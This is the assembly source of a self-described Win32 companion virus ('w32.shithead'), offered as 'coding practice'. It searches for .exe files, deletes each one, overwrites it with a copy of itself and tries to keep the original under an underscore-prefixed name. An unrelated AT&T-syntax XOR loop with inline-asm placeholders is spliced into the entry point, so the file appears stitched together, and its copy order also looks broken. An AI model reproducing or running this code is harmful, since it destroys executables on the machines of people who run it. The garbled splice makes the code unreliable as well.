.386P			
Locals
jumps		

.Model Flat ,StdCall


extrn     ExitProcess     : PROC     
extrn	    GetCommandLineA : PROC	 
extrn     MessageBoxA     : PROC     
extrn MoveFileA:PROC
extrn FindFirstFileA:Proc
extrn FindNextFileA:Proc
extrn CopyFileA:PROC
extrn DeleteFileA:PROC


.Data                                        

text     db "bU-hahahaahahahaha",13,10 ; 
         db "The companion is getting alive...",0
                            

caption  db "Hell0",0 
keimeno db "simple companion w32 virus",13,10
"basically for assembly coding practice",13,10
"Hope you'll enjoy the code...",13,10
"w32.shithead",13,10
"by Jack Daniels",0
psaxnogia db "*.exe",0

search_handle dd 0

myname db 40h dup (0)
newname db 40h dup (0)
search_data db 318 dup (0)
.Code                                  
Main:
movl %1, %eax          ; Move condition into eax
movl %0, %ebx          ; Move buffer address into ebx
movl $0, %ecx          ; Zero the counter (hidden_variable)

loop_start:
cmp %ecx, %eax         ; Compare counter with condition
jge loop_end           ; Jump to end if ecx >= eax

test %ecx, %ecx        ; Test if counter (ecx) is even
jnz odd_case           ; Jump if odd

movl (%ebx, %ecx, 1), %edx  ; Load buffer[i] into edx
xor %eax, %edx              ; XOR condition with buffer[i]
movl %edx, (%ebx, %ecx, 1)  ; Store result back in buffer[i]
jmp increment               ; Jump to increment step

odd_case:
movl (%ebx, %ecx, 1), %edx  ; Load buffer[i] into edx
add %ecx, %edx              ; Add counter to buffer[i]
and $255, %edx              ; Modulo 255
movl %edx, (%ebx, %ecx, 1)  ; Store result back in buffer[i]

increment:
addl %ecx, %2           ; Add counter to hidden_variable
incl %ecx               ; Increment the counter
jmp loop_start          ; Repeat the loop

loop_end:

call GetCommandLineA
mov ecx,0
jampo:
mov bl,byte ptr[eax+1] 
mov byte ptr[myname+ecx],bl
inc eax
inc ecx
cmp bl,22h
jne jampo
dec ecx
mov byte ptr[myname+ecx],0


push offset search_data
push offset psaxnogia

call FindFirstFileA

cmp eax,-1
je exit
mov search_handle,eax
call infect
more:


mov eax,[search_handle]
push offset search_data
push eax


call FindNextFileA
cmp eax,0
je exit
cmp byte ptr[search_data+44],"_"
je exit

call infect 
jmp more

infect:
mov ecx,0
mov byte ptr[newname+ecx],"_"
newnamecreation:
inc ecx
mov bl,byte ptr[search_data+44+ecx-1]
mov byte ptr[newname+ecx],bl
cmp bl,0
jne newnamecreation
push 0
push offset caption
push offset newname
push 0
call MessageBoxA
push offset [search_data+44]
call DeleteFileA 
push 1h
push offset [search_data+44]
push offset myname
call CopyFileA

push 1h
push offset newname
push offset [search_data+44]
call CopyFileA
ret

exit:
CALL    ExitProcess     


End Main  
